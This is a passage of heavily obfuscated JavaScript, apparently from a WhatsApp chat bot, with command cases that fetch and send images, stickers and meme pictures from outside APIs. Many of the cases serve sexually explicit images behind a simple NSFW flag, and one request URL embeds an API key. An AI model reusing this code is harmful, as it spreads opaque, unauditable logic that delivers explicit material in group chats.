buttonsxxxxx=[_0x31126e,_0x50770c],btnxxxx__={'contentText':lang['success'](),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator+('\x20|\x20Request'+_0x134458(0x40a,0x214,0x72c,-0x40))+sender[_0x15af3d(0x53f,0x6b1,0x5f6,0x5f6)]('@')[0x560+-0x197e+-0x19*-0xce],'buttons':buttonsxxxxx,'headerType':0x4,'imageMessage':bacotluxxxxx[_0x15af3d(0x7cc,0x304,0xbaf,0xbbc)][_0x15af3d(0x925,0x536,0x641,0x544)+'ge']},_0x165967={};_0x165967[_0x15af3d(0x556,0x506,0x8a7,0x5d9)+'id']=[sender];const _0x3da880={};_0x3da880[_0x134458(0xadb,0x67a,0x8f8,0x6c7)]=mek,_0x3da880[_0x15af3d(0xabb,0xf24,0xde4,0xc7b)+'o']=_0x165967,alpha[_0x15af3d(0xad5,0xe6c,0xf15,0x8ee)+'e'](from,btnxxxx__,MessageType[_0x15af3d(0x2a4,0x1e0,0x2fe,0x563)+'sage'],_0x3da880)[_0x15af3d(0x852,0x368,0x3f7,0x48a)](_0x5727cd=>{const _0x46c544={'fizDJ':function(_0x2f0388,_0x3fbe84){return _0x2f0388(_0x3fbe84);}};function _0x103732(_0x9259f7,_0x57429c,_0x4b0f42,_0x52c62a){return _0x134458(_0x4b0f42- -0x1a0,_0x57429c-0xde,_0x57429c,_0x52c62a-0x8e);}function _0x67c013(_0x5e3b37,_0x1fe8e1,_0x3c72b8,_0x387508){return _0x15af3d(_0x3c72b8- -0x38,_0x1fe8e1-0x59,_0x387508,_0x387508-0x14c);}_0x46c544[_0x103732(0x1e8,-0x73,0x4f,0x1d7)](reply,lang[_0x67c013(0x645,0x645,0x2ae,0x41d)]());}),await limitAdd(sender,limit);break;case'ahegao':case _0x15af3d(0xc79,0x88c,0x908,0x7d8):case _0x134458(0x384,0x868,0x81c,0x5dd):case _0x15af3d(0x9c4,0x881,0xadf,0x74f):case _0x134458(0x533,0x495,0x6dd,0x31f):case _0x15af3d(0x5e5,0x59a,0x97b,0x59a):case _0x15af3d(0x691,0xb49,0x8e5,0x489):case _0x15af3d(0x340,0x86,0x18,0x5a):case'manga':case'masturbati'+'on':case _0x134458(0x2bf,0x7a2,-0xa6,0x1a9):case _0x15af3d(0xc59,0xf0f,0x84f,0xc7a):case _0x134458(0x4ca,0x995,0x1d4,0x178):case _0x134458(0x9a8,0xc5d,0x9ac,0xd73):case _0x134458(0x74d,0x603,0x856,0x815):const _0x2736fa={};_0x2736fa['displayTex'+'t']='Check\x20Limi'+'t';const _0x2da919={};_0x2da919[_0x15af3d(0xc33,0x7f1,0xb54,0xe13)]=_0x15af3d(0x950,0xb48,0x970,0x4d2),_0x2da919[_0x134458(0x454,0x1cd,0x6da,0x379)]=_0x2736fa,_0x2da919[_0x15af3d(0xa52,0xdbb,0x66b,0x897)]=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang[_0x15af3d(0x950,0xc2b,0xcea,0x5f0)](prefix),'©\x20'+ownername,[_0x2da919]);if(!isNsfw)return reply(lang[_0x134458(0x86c,0x4ac,0x768,0x7da)]());reply(lang[_0x15af3d(0x3cc,0x534,0x2e1,0x199)]());var nsfww=await fetchJson('https://ap'+'i-alphabot'+_0x134458(0x927,0xc26,0x583,0xcf4)+'.com/api/n'+_0x15af3d(0x910,0xc5d,0x4d9,0x5c0)+command+(_0x134458(0x8e5,0xdc6,0x759,0x90d)+_0x15af3d(0x3c6,0x7db,-0x8a,0x49f)));let random_nsfww=await getBuffer(nsfww[_0x15af3d(0x3f4,0x4c6,0x39b,0x808)]);const mediaxxxx=await alpha['prepareMes'+'sage'](from,random_nsfww,MessageType[_0x15af3d(0x4cd,0x959,0x21f,0x96a)],{'thumbnail':Buffer[_0x15af3d(0x5cd,0x75f,0x45f,0xf8)](-0x5*0x56b+0x1*-0x2098+0x3baf)});let bacotluxxxx=mediaxxxx[_0x134458(0x679,0x4e9,0x81c,0x43c)]['ephemeralM'+_0x134458(0x84b,0x841,0x483,0xbeb)]?mediaxxxx[_0x134458(0x679,0x9bd,0x284,0x716)][_0x15af3d(0x94b,0x809,0x75f,0xdf3)+_0x134458(0x84b,0x7ea,0x7aa,0x9a2)]:mediaxxxx;const _0x2c20d7={};_0x2c20d7[_0x134458(0x599,0x631,0x2da,0x7da)+'t']=_0x15af3d(0x2dd,0x289,0x268,0x2b2);const _0xbd22f7={};_0xbd22f7['buttonId']=_0x134458(0x2c0,0x681,0x5dc,0x578),_0xbd22f7[_0x134458(0x454,0x593,0x609,0x318)]=_0x2c20d7,_0xbd22f7[_0x134458(0x8ff,0x713,0xcc2,0x82b)]=0x1;const _0x4e40f0={};_0x4e40f0['displayTex'+'t']=_0x134458(0x85d,0xa5d,0x674,0xcaa);const _0x1b5a5d={};_0x1b5a5d[_0x134458(0xae0,0x94e,0xab0,0xdb9)]=''+command,_0x1b5a5d['buttonText']=_0x4e40f0,_0x1b5a5d['type']=0x1;const buttonsxxxx=[_0xbd22f7,_0x1b5a5d],btnxxx__={'contentText':lang[_0x15af3d(0x9c9,0xcc6,0xa42,0x593)](),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator+('\x20|\x20Request'+_0x134458(0x40a,0x7a4,0x7d2,-0x3d))+sender['split']('@')[-0x14e8+0x1025+-0x17*-0x35],'buttons':buttonsxxxx,'headerType':0x4,'imageMessage':bacotluxxxx[_0x15af3d(0x7cc,0x4e4,0x94e,0x411)]['imageMessa'+'ge']},_0x5df2a9={};_0x5df2a9['mentionedJ'+'id']=[sender];const _0x11aa27={};_0x11aa27['quoted']=mek,_0x11aa27['contextInf'+'o']=_0x5df2a9,alpha[_0x134458(0x982,0x7a5,0xda3,0xb1b)+'e'](from,btnxxx__,MessageType[_0x134458(0x151,0x26b,-0x3d,0x1c)+_0x134458(0x9a3,0xa15,0x5fe,0x58c)],_0x11aa27)[_0x15af3d(0x852,0x708,0xaa7,0x644)](_0x3e1975=>{const _0x360975={'tboYs':function(_0x593d34,_0x507d21){return _0x593d34(_0x507d21);}};function _0x128964(_0x1121c5,_0x385dc5,_0x3d8336,_0xcbba6a){return _0x15af3d(_0xcbba6a- -0x180,_0x385dc5-0xf5,_0x1121c5,_0xcbba6a-0x165);}function _0x1fbc7e(_0x530367,_0x2e69b0,_0x3de019,_0x2921a5){return _0x134458(_0x3de019- -0x3c5,_0x2e69b0-0x155,_0x530367,_0x2921a5-0x181);}_0x360975[_0x128964(-0x5,0x7ce,0x7f3,0x4d1)](reply,lang[_0x1fbc7e(-0x47f,0x50,-0x232,-0xe7)]());}),await limitAdd(sender,limit);break;case _0x15af3d(0x38e,0x38b,0x20,0x498):case'smug':case _0x134458(0x83d,0xc2b,0x7fe,0x77b):case _0x134458(0x3b0,0x2aa,0x407,0x7d8):case _0x15af3d(0x748,0x5bc,0x9b4,0x50d):case _0x15af3d(0xc07,0x10c2,0xf7f,0xfb7):case _0x15af3d(0x89c,0x60e,0xc10,0x91a):case'bj':case _0x15af3d(0x5fd,0xa2f,0x668,0x192):case _0x134458(0x841,0xc79,0xb47,0xa99):case _0x134458(0x962,0xdf6,0xe01,0x995):case _0x134458(0x524,0x8e8,0x1fe,0x2ae):case _0x15af3d(0xaba,0x799,0x9e4,0x7b2)+_0x15af3d(0x493,0x2b8,0x457,0x940):case _0x15af3d(0x80d,0xa22,0x709,0x9eb):case _0x15af3d(0x68c,0x934,0x51c,0x460):case _0x134458(0x862,0x697,0x53f,0x4f1):case _0x15af3d(0x369,0x176,0x1d0,0x7a2):case _0x15af3d(0x799,0xad8,0x606,0x6cb):case'tickle':case _0x15af3d(0x9d6,0xdd8,0x9bd,0xdc3):case _0x15af3d(0x4dd,0x1a,0xa1,0x73):case _0x134458(0x418,0x597,0x4d8,0x5b3):case'boobs':case'anal':case _0x134458(0x8a7,0x6f6,0x837,0xb9a):const _0x59c09a={};_0x59c09a[_0x134458(0x599,0xa40,0x14d,0x277)+'t']='Check\x20Limi'+'t';const _0x895d37={};_0x895d37['buttonId']=_0x15af3d(0x950,0xdef,0x57c,0x6a1),_0x895d37[_0x15af3d(0x5a7,0x261,0x3a9,0x6a6)]=_0x59c09a,_0x895d37[_0x134458(0x8ff,0x760,0x683,0x7d5)]=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang['limit'](prefix),'©\x20'+ownername,[_0x895d37]);if(!isNsfw&&!mek[_0x15af3d(0x53a,0x5c1,0x4fa,0x697)][_0x15af3d(0x2d8,-0x4b,0x3aa,-0x164)]&&!isOwner&&!isCreator)return reply(lang[_0x15af3d(0x9bf,0xa48,0x580,0x66f)]());var ini_gif=await fetchJson(_0x134458(0x5bf,0x235,0x43c,0x4db)+_0x15af3d(0x354,0x2b7,-0xb3,0x418)+_0x15af3d(0xb74,0xd58,0x704,0x7bb)+command),ini_gif_=await getBuffer(ini_gif[_0x134458(0x307,0x109,0x1e5,0x7ba)]);const mediax_=await alpha[_0x134458(0xaa4,0x9f3,0x755,0xea8)+_0x134458(0x9a3,0x963,0x9d9,0x602)](from,ini_gif_,MessageType[_0x15af3d(0x575,0x318,0x5dd,0x597)],{'thumbnail':Buffer[_0x134458(0x47a,0x10d,0x334,0x35d)](-0x1*0x207a+-0x5f4+0x266e)});let bacotlux_=mediax_[_0x134458(0x679,0x1f2,0xa6a,0x94c)][_0x15af3d(0x94b,0x4c1,0xb68,0x7f7)+'essage']?mediax_[_0x15af3d(0x7cc,0x90a,0x2fd,0x838)][_0x134458(0x7f8,0xa3e,0x599,0x786)+_0x15af3d(0x99e,0xc7a,0x8d7,0xd04)]:mediax_;const _0x99314={};_0x99314[_0x15af3d(0x6ec,0x23c,0x483,0xba6)+'t']=_0x15af3d(0x2dd,0x1f5,0xcf,0x14c);const _0x5dd9cd={};_0x5dd9cd[_0x15af3d(0xc33,0x8e9,0xfec,0xc68)]=_0x134458(0x2c0,0x1bb,0x6b3,0x2da),_0x5dd9cd[_0x15af3d(0x5a7,0x9fc,0x248,0x29c)]=_0x99314,_0x5dd9cd[_0x134458(0x8ff,0x7a5,0xd0f,0x58b)]=0x1;const _0x530de2={};_0x530de2['displayTex'+'t']=_0x134458(0xa89,0xd71,0x9e4,0x90b);const _0x21a33e={};_0x21a33e[_0x15af3d(0xc33,0xf0b,0xfcf,0xa98)]='sewa_kak',_0x21a33e['buttonText']=_0x530de2,_0x21a33e['type']=0x1;const buttonsx_=[_0x5dd9cd,_0x21a33e],btnx_={'contentText':lang['success'](),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator+(_0x134458(0x576,0x371,0x244,0x610)+'\x20by\x20@')+sender[_0x134458(0x3ec,0x374,0x602,0x6c2)]('@')[-0x22ba*0x1+-0x1c0f+-0x1*-0x3ec9],'buttons':buttonsx_,'headerType':0x5,'videoMessage':bacotlux_[_0x134458(0x679,0x744,0x2b2,0xa9c)][_0x134458(0x74a,0x2b8,0xb6b,0x62d)+'ge']},_0x206200={};_0x206200[_0x15af3d(0x556,0x514,0x961,0x17b)+'id']=[sender];const _0x1ff90c={};_0x1ff90c[_0x134458(0xadb,0xb49,0xa66,0xf09)]=mek,_0x1ff90c['contextInf'+'o']=_0x206200,alpha[_0x15af3d(0xad5,0x9e6,0x91e,0xe68)+'e'](from,btnx_,MessageType[_0x15af3d(0x2a4,0x2be,0x62e,0x21)+_0x134458(0x9a3,0x4fc,0xdcf,0x4d1)],_0x1ff90c)[_0x134458(0x6ff,0x7ac,0xad8,0x81b)](_0x2ef707=>{function _0x13fac5(_0x11107a,_0x1d5e1c,_0x498886,_0x2208a9){return _0x15af3d(_0x2208a9- -0x47b,_0x1d5e1c-0x162,_0x11107a,_0x2208a9-0x1d7);}const _0x1cedb0={'HFfVd':function(_0x3f50e9,_0x538ad7){return _0x3f50e9(_0x538ad7);}};function _0x595d39(_0x226da5,_0x15a7e7,_0x15a5ab,_0x31c1e9){return _0x134458(_0x15a7e7- -0x8c,_0x15a7e7-0x1dd,_0x15a5ab,_0x31c1e9-0xeb);}_0x1cedb0[_0x13fac5(0x2a9,-0x5b4,0x305,-0x15d)](reply,lang[_0x13fac5(-0x12b,-0x315,-0x601,-0x195)]());});break;case _0x134458(0x5aa,0x41f,0x586,0x160):case _0x15af3d(0x75c,0xbf4,0x60e,0xb91):case _0x134458(0x7e2,0xadc,0x6b3,0xbdc):case'gasm':case'solo':case'8ball':case _0x134458(0xa48,0x806,0x81d,0x57d):case _0x134458(0xad6,0x940,0xd9d,0x7a2):case _0x15af3d(0x7d6,0x7bf,0x4fd,0x85c):case'hololewd':case _0x15af3d(0xc27,0xaa3,0x949,0xad7):case _0x134458(0x288,0x413,0x2eb,0x1ba):case'fox_girl':case _0x15af3d(0x366,0x3ef,0x675,-0x162):case _0x15af3d(0x8b4,0x537,0x8fd,0x703):case _0x134458(0x18e,-0x254,0x7d,0x308):case _0x134458(0x768,0x3dd,0x677,0x7d7):case _0x15af3d(0x636,0x725,0x237,0x516):case _0x134458(0x46e,0x6cd,0x207,0x646):case'neko':case'hentai':case _0x15af3d(0x68b,0x447,0x218,0x41c):case _0x15af3d(0x4c8,0x827,0x850,0x2c8):case _0x134458(0xa01,0xb13,0xa16,0xdfa):case _0x15af3d(0x637,0x21c,0xaa6,0x86e):case _0x15af3d(0x6b6,0x724,0xab0,0x476)+'r':case'erofeet':case _0x15af3d(0xaf3,0xed0,0x6bd,0x9e6):case'wallpaper':case _0x134458(0x1d5,-0x1df,0x64f,-0x123):case _0x134458(0x848,0x8f3,0x538,0xce1):case _0x134458(0x94b,0x77f,0xb3e,0xb4d):case _0x15af3d(0x839,0x5e5,0x897,0x833):case'lewd':case _0x134458(0xa0b,0x83c,0x9b5,0xdd1):case _0x15af3d(0x3b7,0x660,0x68b,0x76b):case _0x134458(0x6eb,0x807,0x7ab,0xaf9):const _0x909545={};_0x909545[_0x15af3d(0x6ec,0x8df,0x6ad,0x454)+'t']=_0x15af3d(0x959,0x66f,0x822,0xb4c)+'t';const _0x256350={};_0x256350[_0x15af3d(0xc33,0xb0c,0x798,0x740)]=_0x15af3d(0x950,0x67f,0x5e0,0xc87),_0x256350[_0x134458(0x454,0x90e,0x7a6,0x681)]=_0x909545,_0x256350[_0x15af3d(0xa52,0x674,0xa30,0x709)]=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang[_0x134458(0x7fd,0x31a,0x944,0x313)](prefix),'©\x20'+ownername,[_0x256350]);if(!isNsfw&&!mek[_0x134458(0x3e7,0x774,0x40e,0x290)][_0x15af3d(0x2d8,-0xc8,0x492,0x6f1)]&&!isOwner&&!isCreator)return reply(lang[_0x134458(0x86c,0xb24,0xa28,0x4a8)]());var ini_img=await fetchJson(_0x134458(0x5bf,0x222,0x2e1,0xa61)+_0x134458(0x201,0x2d2,0x19b,-0xba)+_0x15af3d(0xb74,0xf44,0x773,0xd29)+command),ini_img_=await getBuffer(ini_img['url']);const mediax=await alpha[_0x15af3d(0xbf7,0xfb4,0x7f0,0x774)+_0x15af3d(0xaf6,0x66f,0x916,0xf85)](from,ini_img_,MessageType[_0x134458(0x37a,0x74e,0x573,0x1d)],{'thumbnail':Buffer[_0x15af3d(0x5cd,0x82e,0x258,0x860)](-0x29b*0x1+-0x7cf+0xa6a*0x1)});let bacotlux=mediax['message'][_0x134458(0x7f8,0x40a,0x92c,0xa20)+_0x15af3d(0x99e,0x88f,0x621,0xcc7)]?mediax['message'][_0x134458(0x7f8,0x5bb,0x79d,0xaaa)+'essage']:mediax;const _0x13da9c={};_0x13da9c['displayTex'+'t']=_0x134458(0x18a,0x4c2,0x5f9,-0x1e8);const _0xc8f17={};_0xc8f17[_0x15af3d(0xc33,0xf18,0xa94,0xc84)]='owner',_0xc8f17[_0x15af3d(0x5a7,0x8d6,0x96a,0x264)]=_0x13da9c,_0xc8f17[_0x134458(0x8ff,0xdaf,0x72f,0x918)]=0x1;const _0x331bbd={};_0x331bbd[_0x134458(0x599,0x9e3,0x6ea,0x875)+'t']=_0x15af3d(0x9b0,0x8ff,0x78a,0xe4f);const _0x3233b5={};_0x3233b5[_0x15af3d(0xc33,0xa6e,0x942,0xe7d)]=''+command,_0x3233b5['buttonText']=_0x331bbd,_0x3233b5[_0x134458(0x8ff,0x599,0x999,0x4df)]=0x1;const buttonsx=[_0xc8f17,_0x3233b5],btnx__={'contentText':lang[_0x15af3d(0x9c9,0x86f,0xd79,0x50b)](),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator+('\x20|\x20Request'+_0x15af3d(0x55d,0x933,0x8dc,0x924))+sender['split']('@')[-0x5c9*-0x2+-0x1f5f*-0x1+-0x2af1],'buttons':buttonsx,'headerType':0x4,'imageMessage':bacotlux[_0x15af3d(0x7cc,0xc3d,0xbff,0x452)][_0x134458(0x7d2,0x4e8,0x2f4,0x4ec)+'ge']},_0x2e7305={};_0x2e7305['mentionedJ'+'id']=[sender];const _0x1cb8f7={};_0x1cb8f7[_0x15af3d(0xc2e,0x759,0xea0,0x10f8)]=mek,_0x1cb8f7[_0x134458(0x968,0x614,0xb92,0xb5f)+'o']=_0x2e7305,alpha[_0x134458(0x982,0xbff,0x61a,0xbe4)+'e'](from,btnx__,MessageType[_0x134458(0x151,0x1e0,-0x1d,-0x1aa)+_0x15af3d(0xaf6,0xb4c,0xb5c,0xa8a)],_0x1cb8f7)[_0x134458(0x6ff,0x245,0x4a1,0x33e)](_0x484098=>{function _0x187c8f(_0x33a72e,_0x533f2c,_0x504ea9,_0x3329f0){return _0x134458(_0x504ea9-0x105,_0x533f2c-0x198,_0x33a72e,_0x3329f0-0x1e3);}reply(lang[_0x187c8f(0x4ca,0x55f,0x298,0x581)]());}),await limitAdd(sender,limit);break;case _0x15af3d(0x36d,0x7cd,0x3ce,0x326):const _0x2e98a0={};_0x2e98a0['displayTex'+'t']=_0x15af3d(0x959,0xdd7,0xca9,0x76c)+'t';const _0xdbef1={};_0xdbef1[_0x134458(0xae0,0xcb7,0x99c,0x781)]=_0x15af3d(0x950,0x696,0x6bf,0xca7),_0xdbef1[_0x134458(0x454,0x504,0x73,0x21b)]=_0x2e98a0,_0xdbef1[_0x134458(0x8ff,0xd00,0xc25,0x976)]=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang[_0x15af3d(0x950,0x59d,0xd1d,0x984)](prefix),'©\x20'+ownername,[_0xdbef1]);const pref=_0x15af3d(0x4a6,0x488,0x736,0x4b6)+enter+('\x20amongus\x20u'+'sername\x0aim'+_0x15af3d(0x7cf,0x642,0xaaf,0x853)+'rue\x20/\x20not\x20'+'impostor\x20='+_0x15af3d(0x821,0xb87,0x3e5,0xd0d)+'lor\x20=\x20blac'+'k|blue|bro'+_0x15af3d(0x4b1,0x212,0x764,0x366)+'rkgreen|li'+'me|orange|'+'pink|purpl'+_0x15af3d(0x2cc,0x4bd,0x430,0x70e)+'e|yellow\x20')+enter+enter+_0x15af3d(0xb9e,0x6c6,0xa8c,0xa26)+enter+'\x20'+prefix+(_0x15af3d(0xa46,0x657,0x864,0x8ec)+_0x134458(0x28b,0x69,-0x233,0x20b)+_0x15af3d(0x3fa,0x307,0xa0,0x84f));if(args[_0x134458(0x76b,0x350,0x658,0x475)]<0x1*-0x8ce+-0x1df1+0x26c0)return reply(pref);var kntl_=args[_0x15af3d(0x309,0x366,0x38,0x787)]('\x20'),nama_=kntl_[_0x15af3d(0x53f,0x560,0x362,0x3bf)]('|')[-0x1*-0x23a1+-0x24f1+0x150],impostor_=kntl_[_0x15af3d(0x53f,0x83a,0x790,0xfa)]('|')[0x26b*0x1+-0x2708+0x249e],color_=kntl_[_0x134458(0x3ec,0x21e,0x442,0x244)]('|')[-0x2*-0x99e+0xb8f+-0x1ec9];const _0x21e21a={};_0x21e21a[_0x15af3d(0x4e4,0x9aa,0x63f,0x5a8)]='get';var amongus=await getBuffer(_0x134458(0x95c,0xaca,0xc83,0xc84)+_0x15af3d(0x6ff,0x364,0x440,0xb45)+'api/ejecte'+'d?name='+nama_+_0x15af3d(0xb94,0xd92,0x1064,0x6fd)+impostor_+'&crewmate='+color_,_0x21e21a);amongusp=''+lang[_0x15af3d(0x9c9,0x8c5,0xc92,0x4f7)]()+enter+enter+('Please\x20Sub'+_0x15af3d(0x529,0x521,0x4a7,0x813)+'ps://youtu'+_0x134458(0x626,0x28b,0x4a0,0xa20)+_0x134458(0x15b,0x3c0,0x49,0x4b4)),alpha[_0x134458(0x982,0xca2,0x9c2,0xaf5)+'e'](from,amongus,image,{'thumbnail':Buffer[_0x15af3d(0x5cd,0x657,0x5a6,0x91a)](0x2240+0x1*-0x1d80+-0x4c0),'caption':lang[_0x134458(0x876,0x3c3,0x450,0x4de)](),'quoted':mek}),await limitAdd(sender,limit);break;case'tweettrump':case _0x15af3d(0x776,0x684,0x360,0x616):case _0x15af3d(0x95a,0xc07,0xb7b,0x7c1):if(args[_0x134458(0x76b,0x850,0x4df,0x3c9)]<0x1525+-0x25a6+0x1082)return reply('..');const _0x16e966={};_0x16e966[_0x15af3d(0x6ec,0x6ae,0x6c8,0x480)+'t']=_0x134458(0x806,0x731,0x712,0xc86)+'t';const _0x335f25={};_0x335f25['buttonId']='limit',_0x335f25[_0x134458(0x454,0x42c,0x67f,0x2c1)]=_0x16e966,_0x335f25[_0x134458(0x8ff,0x46d,0xa53,0x537)]=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang['limit'](prefix),'©\x20'+ownername,[_0x335f25]);let trump=args[_0x15af3d(0x309,0x370,0x73c,0x7a4)]('\x20');const _0x35236d={};_0x35236d[_0x134458(0x391,0x72d,0x35d,0x860)]=_0x134458(0x94a,0xc81,0xd87,0x4a8);let trump1=await fetchJson(_0x15af3d(0x712,0xa2f,0x329,0x4a2)+_0x134458(0x622,0xa4a,0x797,0x3f7)+_0x15af3d(0x481,0x5c0,0x824,0x5e4)+'en?type=tr'+_0x15af3d(0x670,0x4f5,0xab2,0x3a2)+_0x134458(0x91d,0x71d,0x7e5,0x81e)+trump+_0x15af3d(0x5e7,0x6b9,0x3e0,0x952),_0x35236d),trump2=await getBuffer(trump1['message']);alpha[_0x15af3d(0xad5,0x6ec,0x922,0x982)+'e'](from,trump2,image,{'thumbnail':Buffer[_0x15af3d(0x5cd,0x5de,0x7e5,0x55e)](0x1*-0xc39+-0xb78*-0x1+-0x1*-0xc1),'caption':lang[_0x15af3d(0x9c9,0x5ce,0x9dc,0xa22)](),'quoted':mek}),await limitAdd(sender,limit);break;case'cmm':if(args[_0x15af3d(0x8be,0xc2b,0x7fd,0x957)]<-0x71a*0x1+0x24ef+0x1*-0x1dd4)return reply('..');const _0x1ea057={};_0x1ea057['displayTex'+'t']=_0x134458(0x806,0x6a0,0xa5f,0x8bf)+'t';const _0x1f7e2b={};_0x1f7e2b[_0x15af3d(0xc33,0xd85,0xa1d,0xcf2)]=_0x15af3d(0x950,0x71f,0x634,0x8a5),_0x1f7e2b[_0x15af3d(0x5a7,0xa21,0x1a3,0x92d)]=_0x1ea057,_0x1f7e2b['type']=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang['limit'](prefix),'©\x20'+ownername,[_0x1f7e2b]);let cmm=args[_0x134458(0x1b6,-0x13c,0x127,0x64d)]('\x20');const _0x587f15={};_0x587f15[_0x15af3d(0x4e4,0x8e2,0x535,0x1be)]=_0x15af3d(0xa9d,0xad2,0x9ab,0x9b8);let anuuu=await fetchJson(_0x15af3d(0x712,0xaa7,0xb2e,0x47a)+_0x134458(0x622,0x69d,0xaa9,0x3d0)+_0x15af3d(0x481,0x269,0x1d4,0x158)+_0x134458(0x1c4,0x284,0x1bf,-0x1fd)+_0x15af3d(0x9b1,0x5e6,0xbba,0x6cc)+_0x134458(0x8ce,0x819,0xb66,0xca4)+cmm+_0x15af3d(0x5e7,0x4d1,0x501,0xa17),_0x587f15),bbuffer=await getBuffer(anuuu[_0x15af3d(0x7cc,0x8af,0xbd7,0x7ac)]);alpha[_0x134458(0x982,0x631,0x7a4,0x582)+'e'](from,bbuffer,image,{'thumbnail':Buffer[_0x134458(0x47a,0x3e,0x911,0x2b2)](-0x1*0x1632+0x8ef*-0x2+0x281*0x10),'caption':lang[_0x15af3d(0x9c9,0xad5,0x61f,0x79b)](),'quoted':mek}),await limitAdd(sender,limit);break;case _0x15af3d(0xb1f,0xc43,0xddf,0xab4):if(args[_0x15af3d(0x8be,0x788,0x501,0x4ed)]<0x549+0x1e21+-0x2369)return reply('..');let kanna=args[_0x134458(0x1b6,-0x330,0x44b,0x5df)]('\x20');const _0x22ee36={};_0x22ee36[_0x15af3d(0x4e4,0x6e1,0x6d,0x990)]=_0x134458(0x94a,0xc95,0x746,0x8c2);var anu_=await fetchJson(_0x134458(0x5bf,0x9da,0x1bb,0xa9f)+'kobot.xyz/'+_0x134458(0x32e,0x61,0xf2,0x78a)+_0x15af3d(0xaff,0x7eb,0xcca,0xa5c)+'nnagen&tex'+'t='+kanna+_0x15af3d(0x5e7,0x3a4,0x498,0x893),_0x22ee36);let buffer_h=await getBuffer(anu_[_0x15af3d(0x7cc,0x377,0xbc6,0x811)]);alpha[_0x15af3d(0xad5,0x78e,0xf29,0xcc1)+'e'](from,buffer_h,image,{'thumbnail':Buffer[_0x134458(0x47a,0x2b0,0x674,0x4e2)](-0x207f*0x1+0xdd9+0x12a6),'caption':lang[_0x15af3d(0x9c9,0xdd6,0xcc7,0xe74)](),'quoted':mek}),await limitAdd(sender,limit);break;case _0x15af3d(0x6b9,0xba0,0x2d4,0x871):case _0x15af3d(0xc82,0xdc3,0xa93,0xe7d):case'chat':case _0x15af3d(0x766,0x4e7,0xb1d,0x63d):case _0x134458(0x812,0xc7c,0xa26,0x543)+'g':case _0x15af3d(0x422,0x844,0x436,0x301):case _0x134458(0x4c6,0xb,0x467,0x6da):case _0x15af3d(0x4c1,0x31f,0x5c3,0x509):case _0x15af3d(0x931,0x6e7,0x7a0,0xa3c):case'kr_robot':case _0x134458(0x9d9,0xa4c,0xaaa,0xbff):case _0x134458(0x4d8,0x252,0x11c,0x69a):case _0x15af3d(0x7b7,0x6ce,0x391,0xca1)+'di':case'menjamet':case _0x15af3d(0xaf3,0xb0c,0x706,0xa65):case'nicholas':case _0x15af3d(0x8f6,0x7b4,0xd49,0x7be):case _0x134458(0x8da,0xa01,0x961,0x4e3):case _0x134458(0x3c1,0xb2,0x234,0x5d1):case'kawan_spon'+_0x134458(0xa82,0x778,0x979,0xe48):case _0x15af3d(0x8b9,0x7f3,0xca9,0x6ff):const _0x432d06={};_0x432d06['displayTex'+'t']=_0x15af3d(0x959,0xb4e,0xa8e,0xd6a)+'t';const _0x6521ef={};_0x6521ef[_0x134458(0xae0,0x677,0x6d7,0x99a)]=_0x15af3d(0x950,0xa96,0x7aa,0x796),_0x6521ef[_0x15af3d(0x5a7,0xa40,0x315,0x145)]=_0x432d06,_0x6521ef[_0x15af3d(0xa52,0xacd,0xcda,0x9cc)]=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang[_0x15af3d(0x950,0xa26,0x82e,0x5f8)](prefix),'©\x20'+ownername,[_0x6521ef]);reply(lang[_0x134458(0x279,0x90,-0x2f,0x48d)]());var telestc=await fetchJson(_0x134458(0x3a1,0x484,0x6b4,0x5d3)+'i-alphabot'+_0x15af3d(0xa7a,0xb9c,0xe28,0xbf0)+'.com/api/t'+_0x134458(0x958,0xca6,0xe12,0xc53)+_0x15af3d(0x864,0xa98,0x51c,0xa37)+command+('?apikey=of'+_0x134458(0x273,0x2b0,0x59c,-0x99)));let random_telestc=await getBuffer(telestc[_0x134458(0x2a1,0xaa,0x2a5,0x744)]);const _0x1ec9a9={};_0x1ec9a9[_0x134458(0xadb,0x76c,0x862,0xd80)]=fgclink,await alpha['sendMessag'+'e'](from,random_telestc,sticker,_0x1ec9a9);var ini_gopaiyy='Hi\x20'+pushname;const _0x54a47a={};_0x54a47a[_0x15af3d(0x6ec,0x802,0x9ae,0xb2d)+'t']=_0x134458(0x76c,0x3f0,0x2ec,0x81a);const _0x22d662={};_0x22d662['buttonId']=_0x15af3d(0x2a6,0x6e7,0x56,-0x1a9),_0x22d662[_0x15af3d(0x5a7,0x541,0x654,0x6b7)]=_0x54a47a,_0x22d662[_0x15af3d(0xa52,0x764,0xd46,0x910)]=0x1;const _0x4cc58f={};_0x4cc58f['displayTex'+'t']=_0x15af3d(0x9b0,0x853,0x6a8,0x6e5);const _0x4a72f7={};_0x4a72f7[_0x15af3d(0xc33,0xbc7,0xc61,0xdeb)]=''+command,_0x4a72f7['buttonText']=_0x4cc58f,_0x4a72f7[_0x15af3d(0xa52,0xc1b,0xf2c,0xae5)]=0x1;var buttonoss=[_0x22d662,_0x4a72f7];const _0x559858={};_0x559858['contentTex'+'t']=ini_gopaiyy,_0x559858[_0x15af3d(0xb05,0xf3a,0xed6,0xdc5)]=_0x15af3d(0xb53,0xc74,0x876,0x79e)+_0x134458(0x294,0xde,0x1b3,0x43f)+_0x134458(0x498,0x408,-0x5b,0x1c),_0x559858[_0x134458(0x321,0x1dc,0x6a7,0x482)]=buttonoss,_0x559858[_0x15af3d(0x58f,0xde,0x58b,0x591)]=0x1,buttonMessagepe=_0x559858;const 